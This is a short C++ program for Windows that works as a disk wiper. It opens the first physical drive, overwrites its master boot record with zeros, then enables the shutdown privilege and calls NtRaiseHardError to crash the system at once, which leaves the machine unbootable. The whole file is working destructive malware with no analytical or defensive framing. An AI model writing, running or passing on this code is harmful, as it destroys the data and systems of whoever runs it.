#include "stdafx.h"
#include <Windows.h>

#pragma comment(lib, "ntdll.lib")


EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);

#define MBR_SIZE 512

int main()
{
	DWORD write;
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
		Sleep(3000);
		BOOLEAN bl;
		unsigned long response;
		RtlAdjustPrivilege(19, true, false, &bl);
		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
		return 0;
	}
	CloseHandle(MasterBootRecord);
	return EXIT_SUCCESS;
}
